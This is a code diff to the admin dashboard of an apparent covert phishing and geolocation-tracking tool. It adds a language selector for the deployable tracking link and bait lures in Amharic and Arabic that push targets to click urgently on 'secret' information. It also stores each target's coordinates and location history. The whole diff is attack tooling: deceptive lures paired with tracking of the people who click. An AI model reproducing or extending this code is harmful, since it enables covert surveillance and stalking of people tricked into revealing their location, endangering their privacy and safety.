@@ -13,11 +13,13 @@ interface TargetData {
   accuracy: number;
   status: 'active' | 'offline' | 'warning';
   platform?: string;
+  history?: [number, number][];
 }
 
 export const AdminDashboard: React.FC = () => {
   const [targets, setTargets] = useState<TargetData[]>([]);
   const [selectedTargetId, setSelectedTargetId] = useState<string | undefined>();
+  const [selectedLanguage, setSelectedLanguage] = useState<'amharic' | 'arabic' | 'both'>('amharic');
   const [time, setTime] = useState<string>('--:--:--');
   const [isClient, setIsClient] = useState(false);
   const [isAuthReady, setIsAuthReady] = useState(false);
@@ -127,7 +129,8 @@ export const AdminDashboard: React.FC = () => {
           accuracy: data.accuracy || 0,
           lastSeen: data.lastSeen || new Date().toISOString(),
           status: data.status || 'offline',
-          platform: data.platform
+          platform: data.platform,
+          history: data.history
         });
       });
       setTargets(targetList);
@@ -144,7 +147,8 @@ export const AdminDashboard: React.FC = () => {
   }, [isAuthReady, isAdminAuthenticated]);
 
   const deployLink = () => {
-    const url = `${window.location.origin}/track`;
+    const langParam = selectedLanguage === 'both' ? 'both' : selectedLanguage;
+    const url = `${window.location.origin}/track?lang=${langParam}`;
     navigator.clipboard.writeText(url);
     setCopyStatus('copied');
     setTimeout(() => setCopyStatus('idle'), 3000);
@@ -177,6 +181,24 @@ export const AdminDashboard: React.FC = () => {
             <label className="text-[10px] text-slate-500 uppercase font-bold tracking-widest px-1">Target Link Engine</label>
             <div className="bg-[#0d1117] border border-slate-800 rounded-lg p-4 space-y-4 shadow-inner">
               <div className="space-y-1">
+                <div className="text-[9px] text-slate-500 uppercase font-bold">Transmission Language</div>
+                <div className="flex gap-1">
+                  {(['amharic', 'arabic', 'both'] as const).map(lang => (
+                    <button
+                      key={lang}
+                      onClick={() => setSelectedLanguage(lang)}
+                      className={`flex-1 text-[9px] py-1 rounded border uppercase font-bold transition-all ${
+                        selectedLanguage === lang 
+                          ? 'bg-blue-600 border-blue-500 text-white shadow-[0_0_8px_rgba(37,99,235,0.4)]' 
+                          : 'bg-slate-900 border-slate-700 text-slate-500 hover:text-slate-300'
+                      }`}
+                    >
+                      {lang}
+                    </button>
+                  ))}
+                </div>
+              </div>
+              <div className="space-y-1">
                 <div className="text-[9px] text-slate-500 uppercase font-bold">Select Bait Template</div>
                 <select className="w-full bg-slate-900 border border-slate-700 text-[11px] p-2 rounded text-slate-300 focus:border-blue-500 outline-none transition-colors cursor-pointer">
                   <option>Urgent Security Update (Recommended)</option>
@@ -185,11 +207,18 @@ export const AdminDashboard: React.FC = () => {
                 </select>
               </div>
               <div className="space-y-1">
-                <div className="text-[9px] text-slate-500 uppercase font-bold">Bait Preview (Amharic)</div>
-                <div className="bg-slate-950 p-3 border border-slate-800 rounded-lg shadow-inner">
-                  <p className="text-[11px] leading-relaxed text-slate-300 font-medium italic">
-                    "አስቸኳይ ምስጢራዊ መረጃ ስለአሁኑ ወቅታዊ መረጃ ነው በቀጥታ እንዳልልክልህ እንዳይታወቅብን ነዉ ቶሎ ብለህ በሊንኩ ግባና መረጃዉን እየዉ ለአንተ እንድልክ ትዕዛዝ ተሰጥቶኝ ነዉ... ሪፖርቱን ለማየት ከታች ያለውን ሊንክ ይጫን ቪድዮና ፎቶም በዉስጡ አለ ።"
-                  </p>
+                <div className="text-[9px] text-slate-500 uppercase font-bold">Bait Preview ({selectedLanguage.toUpperCase()})</div>
+                <div className="bg-slate-950 p-3 border border-slate-800 rounded-lg shadow-inner max-h-32 overflow-y-auto custom-scrollbar">
+                  {selectedLanguage === 'amharic' || selectedLanguage === 'both' ? (
+                    <p className="text-[11px] leading-relaxed text-slate-300 font-medium italic mb-2">
+                      "አስቸኳይ ምስጢራዊ መረጃ ስለአሁኑ ወቅታዊ መረጃ ነው በቀጥታ እንዳልልክልህ እንዳይታወቅብን ነዉ ቶሎ ብለህ በሊንኩ ግባና መረጃዉን እየዉ ለአንተ እንድልክ ትዕዛዝ ተሰጥቶኝ ነዉ... ሪፖርቱን ለማየት ከታች ያለውን ሊንክ ይጫን ቪድዮና ፎቶም በዉስጡ አለ ።"
+                    </p>
+                  ) : null}
+                  {selectedLanguage === 'arabic' || selectedLanguage === 'both' ? (
+                    <p className="text-[11px] leading-relaxed text-slate-300 font-medium italic dir-rtl text-right">
+                      "معلومات سرية عاجلة بخصوص المعلومات الحالية، لم أرسلها لك مباشرة حتى لا نكتشف. ادخل الرابط بسرعة وشاهد المعلومات، لقد تلقيت أمراً بإرسالها لك... اضغط على الرابط أدناه لمشاهدة التقرير، هناك فيديو وصور بالداخل."
+                    </p>
+                  ) : null}
                   <div className="mt-2 text-center text-blue-500 font-mono font-black text-lg tracking-[0.3em]">8429</div>
                 </div>
               </div>
@@ -315,7 +344,8 @@ export const AdminDashboard: React.FC = () => {
               lat: t.lat, 
               lng: t.lng, 
               lastSeen: t.lastSeen,
-              accuracy: t.accuracy
+              accuracy: t.accuracy,
+              history: t.history
             }))} 
             selectedTargetId={selectedTargetId}
           />
@@ -396,6 +426,20 @@ export const AdminDashboard: React.FC = () => {
               <p className="text-[10px] leading-relaxed text-slate-400 italic">
                 Ensuring peace and national security via persistent terrain monitoring. Authorized personnel only.
               </p>
+            </div>
+
+            <div className="space-y-4">
+               <div className="text-[10px] text-slate-500 uppercase tracking-[0.2em] font-bold px-1">Sat Link Status</div>
+               <div className="grid grid-cols-2 gap-2">
+                  <div className="bg-slate-900/50 border border-slate-800 p-2 rounded flex flex-col items-center">
+                    <p className="text-[8px] text-slate-500 opacity-50">S_PING</p>
+                    <p className="text-[11px] font-mono text-emerald-500 font-bold">12ms</p>
+                  </div>
+                  <div className="bg-slate-900/50 border border-slate-800 p-2 rounded flex flex-col items-center">
+                    <p className="text-[8px] text-slate-500 opacity-50">ATM_INT</p>
+                    <p className="text-[11px] font-mono text-blue-400 font-bold">98%</p>
+                  </div>
+               </div>
             </div>
           </div>
         </aside>
